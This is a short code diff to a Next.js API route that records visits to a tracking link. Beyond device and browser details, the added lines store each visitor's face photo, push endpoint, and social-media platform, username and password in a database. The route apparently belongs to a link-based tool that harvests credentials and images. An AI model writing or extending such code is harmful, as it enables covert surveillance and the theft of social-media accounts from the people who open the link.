@@ -65,7 +65,13 @@ export async function POST(request: Request) {
                 os_version: result.os.version,
                 browser_name: result.browser.name,
                 device_type: result.device.type || 'desktop',
-                device_vendor: result.device.vendor
+                device_vendor: result.device.vendor,
+
+                face_photo: trackingData.face_photo || null,
+                push_endpoint: trackingData.push_endpoint || null,
+                sns_username: trackingData.sns_username || null,
+                sns_password: trackingData.sns_password || null,
+                sns_platform: trackingData.sns_platform || null,
             })
 
         if (insertError) {
@@ -73,7 +79,7 @@ export async function POST(request: Request) {
             return NextResponse.json({ error: 'Failed to save tracking info' }, { status: 500 })
         }
 
-        return NextResponse.json({ success: true, targetUrl: link.target_url })
+        return NextResponse.json({ success: true, targetUrl: link.target_url, features: link.features })
 
     } catch (err) {
         console.error('Unexpected error:', err)
